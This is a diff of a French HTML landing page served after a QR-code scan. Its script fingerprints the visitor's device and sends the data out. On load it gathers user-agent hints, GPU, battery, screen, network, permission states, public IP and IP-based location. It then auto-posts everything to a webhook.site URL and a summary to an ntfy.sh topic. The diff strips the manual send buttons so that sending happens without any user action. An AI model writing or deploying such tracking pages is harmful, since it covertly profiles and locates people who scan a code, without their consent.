@@ -2,203 +2,204 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <title>Landing — collecte avancée</title>
+  <title>Landing — collecte (auto, sans permissions)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:18px;max-width:920px;margin:auto}
-    pre{background:#f6f8fa;padding:12px;border-radius:8px;overflow:auto}
-    .bar{background:#fff7d6;border:1px solid #fde68a;padding:10px;border-radius:8px;margin-bottom:12px}
+    pre{background:#f6f8fa;padding:12px;border-radius:8px;overflow:auto;white-space:pre-wrap}
     .muted{color:#6b7280;font-size:13px}
-    button{padding:8px 12px;border:1px solid #ccc;border-radius:8px;background:#fff;cursor:pointer}
+    .note{background:#fff7d6;border:1px solid #fde68a;padding:8px;border-radius:8px;margin-bottom:12px}
   </style>
 </head>
 <body>
-  <div class="bar">
-    Cette page collecte des informations techniques (navigateur, appareil, réseau…) pour l’analyse du scan QR.
-    <span class="muted">Géoloc uniquement si autorisée. Voir JSON ci-dessous.</span>
+  <div class="note">
+    Cette page collecte automatiquement des informations techniques non privées (UA, modèle si exposé, écran, réseau, IP publique, etc.). Elle <b>ne</b> récupère pas la géolocalisation fine ni le nom du téléphone sans permission.  
+    <span class="muted">Si tu veux ajouter la géoloc (popup), ajoute <code>&geo=1</code> à l’URL du QR.</span>
   </div>
 
-  <h1>Merci d’avoir scanné</h1>
+  <h1>Scan reçu — collecte automatique</h1>
   <p><b>Statut :</b> <span id="status">initialisation…</span></p>
-
-  <p>
-    <button id="sendBtn">Forcer l’envoi maintenant</button>
-    <button id="geoBtn">Demander la géoloc</button>
-  </p>
-
-  <pre id="dump">…</pre>
+  <pre id="dump">préparation…</pre>
 
 <script>
-/* ================= CONFIG ================= */
-const DEFAULT_WEBHOOK_URL = 'https://webhook.site/3ff17bc2-1614-47e8-a254-77fd25e86dda'; // ← change-moi
-/* ========================================= */
+/* ====================== CONFIG ====================== */
+/* Remplace par ta valeur par défaut si tu veux */
+const DEFAULT_WEBHOOK_URL = 'https://webhook.site/3ff17bc2-1614-47e8-a254-77fd25e86dda';
+const DEFAULT_NTFY_TOPIC  = 'maison';
+/* ==================================================== */
 
 const $ = s => document.querySelector(s);
-const setStatus = t => $('#status').textContent = t;
-const showDump = o => $('#dump').textContent = JSON.stringify(o, null, 2);
+const setStatus = t => { $('#status').textContent = t; };
+const showDump = o => { $('#dump').textContent = JSON.stringify(o, null, 2); };
+
 const qs = new URLSearchParams(location.search);
-
 const WEBHOOK_URL = qs.get('wh') || DEFAULT_WEBHOOK_URL;
-const NTFY_TOPIC  = qs.get('topic') || 'qr-scann-test-1';
-const AUTO_SEND   = (qs.get('autosend') ?? '1') !== '0'; // auto par défaut
-const WANT_GEO    = (qs.get('geo') ?? '0') === '1';      // off par défaut
+const NTFY_TOPIC  = qs.get('topic') || DEFAULT_NTFY_TOPIC;
+const AUTO_SEND   = (qs.get('autosend') ?? '1') !== '0';
+const WANT_GEO    = (qs.get('geo') ?? '0') === '1'; // si 1 => demandera permission geoloc
 
-/* ---------- Collecte enrichie ---------- */
-async function getIPAndGeo(){
-  // Essaye ipapi.co, fallback ipwho.is
-  try {
-    const r = await fetch('https://ipapi.co/json/', {cache:'no-store'});
-    if (r.ok) { const j = await r.json(); return { ip: j.ip, ip_geo: j }; }
-  } catch(e){}
-  try {
-    const r = await fetch('https://ipwho.is/', {cache:'no-store'});
-    if (r.ok) { const j = await r.json(); return { ip: j.ip, ip_geo: j }; }
-  } catch(e){}
-  return { ip: null, ip_geo: null };
-}
-
-async function getStorageEstimate(){
-  try {
-    if (navigator.storage && navigator.storage.estimate) {
-      const est = await navigator.storage.estimate();
-      return { quota: est.quota || null, usage: est.usage || null };
-    }
-  } catch(e){}
-  return null;
-}
-
-function getWebGLInfo(){
-  try {
-    const c = document.createElement('canvas');
-    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-    if (!gl) return null;
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    return {
-      vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
-      renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
-    };
-  } catch(e){ return { error: String(e) }; }
-}
-
-async function enumerateMedia(){
-  try{
-    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
-    const list = await navigator.mediaDevices.enumerateDevices();
-    const counts = list.reduce((a,d)=>{ a[d.kind]=(a[d.kind]||0)+1; return a; }, {});
-    return { counts, hasLabels: !!(list.find(d=>d.label)) };
-  }catch(e){ return { error: String(e) }; }
-}
-
-async function getPermissions(){
-  if (!navigator.permissions) return null;
-  const names = ['geolocation','camera','microphone','notifications'];
-  const out = {};
-  await Promise.all(names.map(async n=>{
-    try{
-      const s = await navigator.permissions.query({name:n});
-      out[n] = s.state; // 'granted' | 'denied' | 'prompt'
-    }catch(e){ out[n] = 'unknown'; }
-  }));
+/* ------------------ helpers ------------------ */
+function randId(len=10){
+  const chars='abcdef0123456789';
+  let out='';
+  for(let i=0;i<len;i++) out+=chars[Math.floor(Math.random()*chars.length)];
   return out;
 }
 
-function likelyDevice(ua){
-  ua = (ua||'').toLowerCase();
-  if (ua.includes('iphone')) return 'Apple iPhone';
-  if (ua.includes('ipad')) return 'Apple iPad';
-  if (ua.includes('android')) return 'Android';
-  if (ua.includes('mac os') || ua.includes('macintosh')) return 'Mac';
-  if (ua.includes('windows')) return 'Windows PC';
-  return 'Inconnu';
-}
-
-async function collectAll(doGeoloc=false){
+/* Collecte d'infos natives (sans permissions) */
+async function collectClientInfo({allowGeo=false} = {}){
   const info = {};
   info.ts = new Date().toISOString();
+  info.scan_id = randId(12);
   info.url = location.href;
   info.referrer = document.referrer || null;
 
-  // UA/UA-CH
+  // navigator basics
   info.userAgent = navigator.userAgent || null;
-  try{
-    if (navigator.userAgentData){
-      info.uaData = { mobile: navigator.userAgentData.mobile ?? null, brands: navigator.userAgentData.brands ?? null };
-      if (navigator.userAgentData.getHighEntropyValues){
-        info.uaData.highEntropy = await navigator.userAgentData.getHighEntropyValues(
-          ['platform','platformVersion','model','architecture','bitness','fullVersionList']
-        );
-      }
-    }
-  }catch(e){ info.uaDataError = String(e); }
-
-  // Locale / time
   info.language = navigator.language || null;
   info.languages = navigator.languages || null;
-  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
-  info.tzOffsetMin = new Date().getTimezoneOffset();
-
-  // Device features
   info.platform = navigator.platform || null;
   info.vendor = navigator.vendor || null;
+  info.cookieEnabled = navigator.cookieEnabled;
+  info.doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack || null;
+
+  // screen / viewport
+  info.screen = {
+    width: screen.width, height: screen.height,
+    availWidth: screen.availWidth, availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth
+  };
+  info.viewport = { innerWidth: innerWidth, innerHeight: innerHeight, devicePixelRatio: window.devicePixelRatio };
+
+  // device info heuristiques
   info.device = {
-    likely: likelyDevice(info.userAgent),
-    model: info.uaData?.highEntropy?.model || null,
     hardwareConcurrency: navigator.hardwareConcurrency || null,
     deviceMemory: navigator.deviceMemory || null,
     maxTouchPoints: navigator.maxTouchPoints || 0
   };
 
-  // Screen/viewport
-  info.screen = { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth };
-  info.viewport = { innerWidth, innerHeight, devicePixelRatio: window.devicePixelRatio };
+  // UA Client Hints (if available) - non-intrusive
+  try {
+    if (navigator.userAgentData) {
+      info.uaData = { mobile: navigator.userAgentData.mobile ?? null, brands: navigator.userAgentData.brands ?? null };
+      if (navigator.userAgentData.getHighEntropyValues) {
+        try {
+          const high = await navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','model','architecture','bitness','fullVersionList']);
+          info.uaData.highEntropy = high;
+        } catch(e){
+          info.uaData.highEntropyError = String(e);
+        }
+      }
+    }
+  } catch(e){ info.uaDataError = String(e); }
 
-  // Storage
-  info.storage = await getStorageEstimate();
+  // connection
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
+    if (c) info.connection = { effectiveType: c.effectiveType || null, downlink: c.downlink || null, rtt: c.rtt || null, saveData: c.saveData || null };
+  } catch(e){}
 
-  // Battery
+  // battery (généralement accessible sans popup)
   try {
     if (navigator.getBattery) {
-      const b = await navigator.getBattery();
-      info.battery = { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+      const bat = await navigator.getBattery();
+      info.battery = { charging: bat.charging, level: bat.level, chargingTime: bat.chargingTime, dischargingTime: bat.dischargingTime };
     }
   } catch(e){ info.batteryError = String(e); }
 
-  // Network
-  try{
-    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (c) info.connection = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
-  }catch(e){}
+  // storage estimate
+  try {
+    if (navigator.storage && navigator.storage.estimate) {
+      const est = await navigator.storage.estimate();
+      info.storageEstimate = { quota: est.quota || null, usage: est.usage || null };
+    }
+  } catch(e){}
 
-  // Permissions status
-  info.permissions = await getPermissions();
+  // webgl info (GPU vendor/renderer possible)
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (gl) {
+      const debug = gl.getExtension && gl.getExtension('WEBGL_debug_renderer_info');
+      info.webgl = {
+        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
+      };
+    }
+  } catch(e){ info.webglError = String(e); }
 
-  // Media devices (counts)
-  info.media = await enumerateMedia();
-
-  // Audio
-  try { const ac = new (window.AudioContext||window.webkitAudioContext)(); info.audio = { sampleRate: ac.sampleRate }; ac.close(); } catch(e){}
-
-  // WebGL/GPU
-  info.webgl = getWebGLInfo();
-
-  // MIME types
+  // mimeTypes (may be empty on mobiles)
   try { info.mimeTypes = Array.from(navigator.mimeTypes || []).map(m=>({type:m.type,desc:m.description})); } catch(e){}
 
-  // IP + geo by service
-  const ip = await getIPAndGeo();
-  info.ip = ip.ip;
-  info.ip_geo = ip.ip_geo;
+  // permissions status (query does not trigger prompt)
+  try {
+    if (navigator.permissions && navigator.permissions.query) {
+      const names = ['geolocation','camera','microphone','notifications'];
+      info.permissions = {};
+      await Promise.all(names.map(async n=>{
+        try{
+          const s = await navigator.permissions.query({ name: n });
+          info.permissions[n] = s.state; // granted/denied/prompt
+        } catch(e){
+          info.permissions[n] = 'unsupported';
+        }
+      }));
+    }
+  } catch(e){ info.permissionsError = String(e); }
 
-  // Geolocation (browser prompt) if requested
-  if (doGeoloc && navigator.geolocation){
+  // enumerate media devices -> counts (labels will be empty unless permission granted)
+  try {
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      const list = await navigator.mediaDevices.enumerateDevices();
+      info.mediaDevices = {
+        total: list.length,
+        counts: list.reduce((acc,d)=>{ acc[d.kind]=(acc[d.kind]||0)+1; return acc; }, {})
+      };
+    }
+  } catch(e){ info.mediaDevicesError = String(e); }
+
+  // audio context sample rate (no permission)
+  try {
+    const AC = window.AudioContext || window.webkitAudioContext;
+    if (AC) {
+      const ac = new AC();
+      info.audio = { sampleRate: ac.sampleRate };
+      ac.close && ac.close();
+    }
+  } catch(e){}
+
+  // IP + geo via external service (ipapi / ipwho.is fallback)
+  try {
+    let ipResp = null;
+    try {
+      const r = await fetch('https://ipapi.co/json/', {cache:'no-store'}); if (r.ok) ipResp = await r.json();
+    } catch(e){}
+    if(!ipResp){
+      try { const r2 = await fetch('https://ipwho.is/', {cache:'no-store'}); if (r2.ok) ipResp = await r2.json(); } catch(e){}
+    }
+    if (ipResp) {
+      info.ip = ipResp.ip || ipResp.client_ip || null;
+      info.ip_geo = ipResp;
+    } else {
+      info.ip = null;
+      info.ip_geo = null;
+    }
+  } catch(e){ info.ipError = String(e); }
+
+  // geolocation (only if explicitly allowed via allowGeo param -> will prompt)
+  if (allowGeo && navigator.geolocation) {
     info.geolocationPrompted = true;
-    await new Promise(res=>{
-      navigator.geolocation.getCurrentPosition(
-        pos => { info.geolocation = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }; res(); },
-        err => { info.geolocation = { error: err.message || String(err.code) }; res(); },
-        { enableHighAccuracy:false, maximumAge:60000, timeout:10000 }
-      );
-    });
+    try {
+      await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(pos=>{
+          info.geolocation = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
+          resolve();
+        }, err=>{
+          info.geolocation = { error: err.message || String(err.code) };
+          resolve();
+        }, { enableHighAccuracy:false, timeout:10000, maximumAge:60000 });
+      });
+    } catch(e){ info.geolocationError = String(e); }
   } else {
     info.geolocationPrompted = false;
   }
@@ -206,64 +207,95 @@ async function collectAll(doGeoloc=false){
   return info;
 }
 
-/* ---------- Envoi ---------- */
-async function sendWebhook(payload){
-  try{
-    const r = await fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
-    return {ok:r.ok, status:r.status};
-  }catch(e){ return {ok:false, error:String(e)}; }
+/* send helpers */
+async function postJSON(url, obj){
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(obj)
+    });
+    return { ok: res.ok, status: res.status, text: await res.text().catch(()=>'') };
+  } catch(e){ return { ok:false, error: String(e) }; }
 }
 
-function summarizeForNtfy(info){
-  const uaBrands = info.uaData?.brands?.map(b=>b.brand||b.brandName).join(', ');
-  return [
-    `QR scan — ${info.device?.likely}${info.device?.model ? ' ('+info.device.model+')':''}`,
-    `IP: ${info.ip || 'n/d'} • ${info.ip_geo?.country_name || info.ip_geo?.country || ''} ${info.ip_geo?.city ? '— '+info.ip_geo.city : ''}`,
-    `OS: ${info.uaData?.highEntropy?.platform || info.platform || 'n/d'} • Browser: ${uaBrands || 'n/d'}`,
-    `Langue: ${info.language || 'n/d'} • TZ: ${info.timezone || 'n/d'}`,
-    `Écran: ${info.screen?.width}x${info.screen?.height} DPR ${info.viewport?.devicePixelRatio}`,
-    info.connection ? `Réseau: ${info.connection.effectiveType||'n/d'} ~${info.connection.downlink||'?'} Mbps` : '',
-    info.battery ? `Batterie: ${Math.round((info.battery.level||0)*100)}% ${info.battery.charging?'(charge)': ''}` : '',
-    info.webgl ? `GPU: ${info.webgl.vendor || ''} ${info.webgl.renderer || ''}` : ''
+async function sendNtfy(topic, titleLines, clickUrl=null){
+  try {
+    const headers = {
+      'Content-Type': 'text/plain; charset=utf-8',
+      'Title': titleLines[0] || 'QR scan',
+      'Tags': 'qr,scan',
+      'Priority': '3'
+    };
+    if (clickUrl) headers['Click'] = clickUrl;
+    await fetch(`https://ntfy.sh/${encodeURIComponent(topic)}`, { method:'POST', headers, body: titleLines.join('\n') });
+    return { ok:true };
+  } catch(e){ return { ok:false, error: String(e) }; }
+}
+
+/* simple summarizer for ntfy */
+function makeSummary(info){
+  const ua = info.userAgent || '';
+  const model = info.uaData?.highEntropy?.model || null;
+  const platform = info.uaData?.highEntropy?.platform || info.platform || null;
+  const likely =
+    /iphone/i.test(ua) ? 'iPhone' :
+    /ipad/i.test(ua) ? 'iPad' :
+    /android/i.test(ua) ? 'Android' :
+    /windows/i.test(ua) ? 'Windows' :
+    /mac os|macintosh/i.test(ua) ? 'Mac' : 'Device';
+  const lines = [
+    `QR scan — ${likely}${model ? ' ('+model+')' : ''}`,
+    `IP: ${info.ip || 'n/d'} • ${info.ip_geo?.country || info.ip_geo?.country_name || ''}`,
+    `OS: ${platform || 'n/d'} • Browser: ${info.uaData?.brands ? info.uaData.brands.map(b=>b.brand).join(', ') : 'n/d'}`,
+    `Screen: ${info.screen?.width}x${info.screen?.height} DPR ${info.viewport?.devicePixelRatio || '?'}`,
+    info.connection ? `Network: ${info.connection.effectiveType || '?'} ~${info.connection.downlink || '?'} Mbps` : '',
+    info.battery ? `Battery: ${Math.round((info.battery.level||0)*100)}% ${info.battery.charging? '(charging)':''}` : ''
   ].filter(Boolean);
+  return lines;
 }
 
-async function sendNtfy(topic, title, lines, clickUrl=null){
-  const headers = {'Content-Type':'text/plain; charset=utf-8','Title':title,'Tags':'qr,scan','Priority':'3'};
-  if (clickUrl) headers['Click'] = clickUrl;
-  try{
-    await fetch(`https://ntfy.sh/${encodeURIComponent(topic)}`, { method:'POST', headers, body: lines.join('\n') });
-  }catch(e){}
+/* ============ main ============ */
+let lastPayload = null;
+
+async function runMain(){
+  try {
+    setStatus('Collecte des données (sans permissions)…');
+    const info = await collectClientInfo({ allowGeo: WANT_GEO }); // WANT_GEO true triggers popup
+    lastPayload = {
+      event: 'qr_scan',
+      timestamp: new Date().toISOString(),
+      scan_url: location.href,
+      client: info
+    };
+    showDump(lastPayload);
+
+    // auto send if demandé
+    if (AUTO_SEND) {
+      setStatus('Envoi JSON vers webhook…');
+      const r = await postJSON(WEBHOOK_URL, lastPayload);
+      if (r.ok) setStatus('Envoyé vers webhook ✅ ('+r.status+')');
+      else setStatus('Échec envoi webhook — voir console');
+
+      // envoi résumé vers ntfy
+      setStatus('Envoi résumé vers ntfy…');
+      const summary = makeSummary(info);
+      await sendNtfy(NTFY_TOPIC, summary, WEBHOOK_URL);
+      setStatus('Notif ntfy envoyée ✅');
+    } else {
+      setStatus('Collecte terminée — autosend désactivé.');
+    }
+  } catch(e){
+    console.error(e);
+    setStatus('Erreur — voir console.');
+  }
 }
 
-/* ---------- Main ---------- */
-let payload = null;
+// start automatically
+runMain();
 
-async function run(doAutoSend=true, doGeo=false){
-  setStatus('Collecte des informations…');
-  const info = await collectAll(doGeo);
-  payload = { event:'qr_scan', timestamp:new Date().toISOString(), scan_url: location.href, client: info };
-  showDump(payload);
-  setStatus(doAutoSend ? 'Envoi automatique…' : 'Prêt (envoi manuel possible).');
-
-  if (!doAutoSend) return;
-
-  // Envoi JSON complet
-  const r = await sendWebhook(payload);
-  if (r.ok) setStatus(`Envoyé vers webhook ✅ (status ${r.status})`);
-  else setStatus('Échec envoi webhook — voir console');
-
-  // Notif ntfy (résumé lisible). Click = ouvre le webhook (si c’est ton webhook.site).
-  const lines = summarizeForNtfy(info);
-  await sendNtfy(NTFY_TOPIC, 'QR scan détecté', lines, WEBHOOK_URL);
-  setStatus('Notification ntfy envoyée ✅');
-}
-
-$('#sendBtn').onclick = () => run(true, false);
-$('#geoBtn').onclick  = () => run(true, true);
-
-// Lancement : autosend + géoloc selon query
-run(AUTO_SEND, WANT_GEO);
+// Expose for debugging in console
+window._qr_lastPayload = () => lastPayload;
 </script>
 </body>
 </html>
